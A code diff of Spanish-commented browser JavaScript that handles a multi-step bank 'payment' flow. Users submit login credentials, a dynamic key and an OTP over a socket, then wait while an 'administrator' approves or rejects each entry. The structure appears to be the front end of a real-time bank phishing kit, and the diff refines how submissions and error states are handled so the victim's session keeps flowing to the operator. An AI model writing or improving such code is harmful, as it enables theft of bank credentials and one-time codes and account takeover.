@@ -31,6 +31,8 @@
 
     // Callback único por pantalla
     window.__rtUpdateCb = null;
+    RT._awaiting = null; // "AUTH" | "DINAMIC" | "OTP" | null
+    RT._seenWait = false; // true cuando llega *_WAIT_ACTION del submit actual
 
     function safeShowLoading(msg) {
         window.showLoading?.(msg);
@@ -81,6 +83,13 @@
             if (!s || !s.action) return;
 
             const action = String(s.action);
+
+            if (RT._awaiting && !RT._seenWait) {
+                if (RT._awaiting === "AUTH" && action === "AUTH_ERROR") return;
+                if (RT._awaiting === "DINAMIC" && action === "DINAMIC_ERROR")
+                    return;
+                if (RT._awaiting === "OTP" && action === "OTP_ERROR") return;
+            }
             console.log(action);
             const expected = RT.actionToScreen[action];
             const current = RT.step;
@@ -88,11 +97,12 @@
             // ✅ Alertas (si usas alertId)
             const alertId = RT.alertId;
             console.log(action);
+            console.log(action);
 
             // ✅ Loading: se queda mientras espera al admin
             if (isWait) {
+                RT._seenWait = true; // ✅ ya entró en WAIT del submit actual
                 safeShowLoading("Enviado. Esperando al administrador...");
-                // opcional: limpiar alerta
                 if (alertId) window.hideBankAlert?.(alertId);
                 return; // ✅ no redirigir
             }
@@ -122,12 +132,39 @@
                 return;
             }
 
+            if (action === "DINAMIC_ERROR") {
+                safeHideLoading();
+
+                const msg = s?.lastError || "Dato inválido. Intenta nuevamente.";
+
+                // ✅ Si YA estás en step3, NO recargues la página: solo muestra alerta
+                if (String(RT.step) === "3") {
+                    const alertId = RT.alertId || "dinamicError";
+                    window.showBankAlert?.(alertId, msg);
+                    // aquí también puedes disparar tu callback para desbloquear inputs
+                    if (typeof window.__rtUpdateCb === "function") window.__rtUpdateCb(s);
+                    return;
+                }
+
+                // ✅ Si no estás en step3, guarda y redirige
+                try { sessionStorage.setItem("rt_last_error", String(msg)); } catch {}
+                window.location.href = `/pago/${RT.bank}/step/3`;
+                return;
+                }
+
+            if (!action.endsWith("_WAIT_ACTION")) {
+                if (action === "DINAMIC" || action === "OTP" || action === "AUTH_ERROR" || action === "DINAMIC_ERROR" || action === "OTP_ERROR") {
+                    RT._awaiting = null;
+                    RT._seenWait = false;
+                }
+            }
+
             // 3) Acciones "finales" que avanzan
             if (expected && current && expected !== current) {
                 window.location.href = `/pago/${RT.bank}/step/${expected}`;
                 return;
             }
-            
+
             // ✅ callback para lógica por pantalla
             if (typeof window.__rtUpdateCb === "function") {
                 try {
@@ -196,6 +233,12 @@
     // ✅ Esta es la pieza clave: si no hay conexión, la crea y encola el emit
     window.rtEmitSubmit = function (eventName, payload, ackCb) {
         safeShowLoading("Enviado. Esperando al administrador...");
+
+        // ✅ marcar qué flujo está esperando
+        if (eventName === "user:submit_auth") RT._awaiting = "AUTH";
+        if (eventName === "user:submit_dinamic") RT._awaiting = "DINAMIC";
+        if (eventName === "user:submit_otp") RT._awaiting = "OTP";
+        RT._seenWait = false;
 
         // si no hay socket o no está conectado, encola y conecta
         if (!socket || !socket.connected) {
